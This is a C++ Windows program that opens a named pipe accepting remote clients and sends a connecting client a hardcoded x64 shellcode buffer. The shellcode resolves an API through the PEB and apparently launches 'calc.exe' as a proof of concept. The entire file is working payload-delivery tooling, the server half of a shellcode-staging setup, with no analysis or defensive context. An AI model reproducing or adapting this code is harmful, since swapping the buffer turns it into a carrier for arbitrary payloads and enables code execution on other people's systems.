#include <Windows.h>
#include <Intsafe.h>
#include <iostream>
#include <cstdint>
#include <cstring>

HANDLE hServerPipe = nullptr; // handle for the server pipe
BOOL bConnected = false; // indicates whether the client is connected 
BOOL bSent = false; // indicates whether the server successfully sent the shellcode to the client
DWORD dwBytesSent = 0; // number of bytes the server sent 

constexpr unsigned int uiMaxInstances = 1; // maximum number of instances for the server pipe to handle
constexpr unsigned int uiBuffSize = 4096;  // maximum number of bytes of the messages to read / write from the server pipe

int main(int argc, char *argv[]) {

    /* get the shellcode + it's size from argv*/
    const char shellcode[] =   "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";
    const std::size_t stShellcodeLen = strlen(shellcode);

    DWORD dwShellcodeLen = 0;
    auto result = SSIZETToDWord(stShellcodeLen, &dwShellcodeLen);

    if (result != S_OK) {
        std::cerr << "Failed in converting the size of the shellcode into a DWORD\n" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "\nSize of the shellcode: " << dwShellcodeLen << '\n';

    /* create the server pipe line */
    hServerPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\MagonServer", // name of pipe
        PIPE_ACCESS_DUPLEX, 
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS, // message read mode 
        PIPE_UNLIMITED_INSTANCES, // max number of instances
        uiBuffSize, // buffer size for output
        uiBuffSize, // buffer size for input
        0, // default timeout of 50 milliseconds
        NULL // default security attributes
    );

    /* check for the return value of CreateNamedPipeA */
    if (hServerPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed in creating the server pipeline\n" << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "Created the server pipeline, waiting for connection...\n";

    bConnected = ConnectNamedPipe(
        hServerPipe, // the server pipe handle
        NULL // didn't open the pipe using FILE_FLAG_OVERLAPPED, so ignore
    );

    /* check for the return value of ConnectNamedPipe */
    if (bConnected == FALSE) {
        std::cerr << "Failed in connecting a client to the server pipeline, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Connected to the remote client\n";

    /* after connecting, can pass the shellcode + it's size to the client */
    bSent = WriteFile(
        hServerPipe,
        shellcode,
        dwShellcodeLen,
        &dwBytesSent,
        NULL
    );

    /* check for the return value of WriteFile + how many bytes had sent */
    if (bSent == FALSE || dwBytesSent != dwShellcodeLen) {
        std::cerr << "Failed in sending the client the shellcode, error code: " << GetLastError() << std::endl;
        DisconnectNamedPipe(hServerPipe);
        CloseHandle(hServerPipe);
        return EXIT_FAILURE;
    }

    std::cout << "Sent the client the shellcode\n";

    /* Flush the pipe to allow the client to read the pipe's contents 
       before disconnecting. Then disconnect the pipe, and close the 
       handle to this pipe instance. */

    FlushFileBuffers(hServerPipe);
    DisconnectNamedPipe(hServerPipe);
    CloseHandle(hServerPipe);

    std::cout << "Clsed the server pipeline, closing the program..." << std::endl;

    return 0;
}